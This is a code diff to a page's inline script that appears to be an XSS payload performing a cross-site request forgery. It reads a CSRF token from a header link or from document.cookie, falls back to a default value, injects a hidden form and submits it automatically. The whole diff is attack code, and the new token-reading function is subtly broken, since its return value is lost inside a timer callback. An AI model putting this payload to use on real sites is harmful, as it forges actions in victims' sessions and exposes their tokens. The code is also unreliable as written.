@@ -10,18 +10,9 @@
         <script>
             (function () {
                 
-                var csrf = 'a1b2';
-                setTimeout(function(){
-                    try {
-                        var header = document.getElementById("header").getElementsByTagName("a")[0];
-                        var href = header.getAttribute("href");
-                        csrf = href.split("=")[1];
-                    }
-                    catch(e) {
-                        console.log("couldn't get the CSRF token using XSS!");
-                    }
-                }, 3);
-
+                var csrf = getTokenFromHTML();
+                csrf = (csrf === '') ? getTokenFromCookie() : csrf;
+                csrf = (csrf === '') ? 'a1b2' : csrf;
                 var form = createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
                 var div = document.getElementById("mycsrf");
                 div.appendChild(form);
@@ -30,6 +21,25 @@
                 csrfForm.submit();
                 
             })();
+            
+            function getTokenFromHTML() {
+                var csrfToken;
+                setTimeout(function(){
+                    try {
+                        var header = document.getElementById('header').getElementsByTagName('a')[0];
+                        var href = header.getAttribute('href');
+                        return href.split('=')[1];
+                    }
+                    catch(e) {
+                        console.log("couldn't get the CSRF token using XSS!");
+                    }
+                }, 3);
+            }
+            
+            function getTokenFromCookie() {
+                var csrfCookie = document.cookie.split(';')[0];
+                return csrfCookie.split('=')[1];
+            }
             
             function addInputToForm(form, name, value) {
                 // Create a hidden input element, and append it to the form
